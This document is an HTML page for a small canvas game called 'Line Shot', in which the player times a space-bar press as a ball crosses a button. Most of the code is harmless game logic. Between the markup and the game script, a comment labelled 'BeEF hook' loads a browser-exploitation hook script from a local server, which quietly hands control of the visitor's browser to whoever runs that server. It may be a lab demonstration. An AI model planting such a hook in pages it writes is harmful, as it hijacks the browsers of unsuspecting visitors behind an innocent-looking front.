<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Line Shot Game</title>
<style>
  body {
    margin: 0;
    background: #222;
    color: #fff;
    font-family: Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
  }
  canvas {
    background: #111;
    margin-top: 20px;
    border: 2px solid #555;
  }
  #score {
    font-size: 1.5rem;
    margin-top: 10px;
  }
</style>
</head>
<body>
<h1>ðŸŽ¯ Line Shot: Hit the Button!</h1>
<p>Press <b>SPACE</b> when the ball passes over the button.</p>
<div id="score">Score: 0</div>
<canvas id="gameCanvas" width="500" height="500"></canvas>

<!-- BeEF hook -->
<script src="http://127.0.0.1:3000/hook.js"></script>

<script>
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
const scoreDisplay = document.getElementById('score');

const centerX = canvas.width / 2;
const centerY = canvas.height / 2;
const buttonRadius = 30;

let ballX = centerX;
let ballY = centerY;
let angle = Math.random() * 2 * Math.PI;
let speed = 2.5;

let score = 0;
let combo = 0;
let comboText = '';
let comboTimer = 0;

document.addEventListener('keydown', (e) => {
  if (e.code === 'Space') {
    const dx = ballX - centerX;
    const dy = ballY - centerY;
    const dist = Math.sqrt(dx * dx + dy * dy);

    if (dist <= buttonRadius) {
      // HIT!
      score++;
      combo++;
      comboText = `COMBO x${combo}`;
      comboTimer = 60; // show for 1 second
      resetBall();
    } else {
      // MISS!
      combo = 0;
    }
    updateScore();
  }
});

function updateScore() {
  scoreDisplay.textContent = `Score: ${score}`;
}

function resetBall() {
  ballX = centerX;
  ballY = centerY;
  angle = Math.random() * 2 * Math.PI;
}

function drawButton() {
  ctx.fillStyle = '#0078d7';
  ctx.beginPath();
  ctx.arc(centerX, centerY, buttonRadius, 0, 2 * Math.PI);
  ctx.fill();
}

function drawBall() {
  ctx.fillStyle = 'yellow';
  ctx.beginPath();
  ctx.arc(ballX, ballY, 10, 0, 2 * Math.PI);
  ctx.fill();
}

function drawCombo() {
  if (comboTimer > 0 && combo > 1) {
    ctx.fillStyle = 'lime';
    ctx.font = '24px Arial';
    ctx.textAlign = 'center';
    ctx.fillText(comboText, centerX, centerY - 50);
    comboTimer--;
  }
}

function gameLoop() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  // Update ball position
  ballX += Math.cos(angle) * speed;
  ballY += Math.sin(angle) * speed;

  // Check bounds
  if (ballX < 0 || ballX > canvas.width || ballY < 0 || ballY > canvas.height) {
    combo = 0; // missed
    resetBall();
    updateScore();
  }

  drawButton();
  drawBall();
  drawCombo();

  requestAnimationFrame(gameLoop);
}

// Start game
updateScore();
gameLoop();
</script>
</body>
</html>
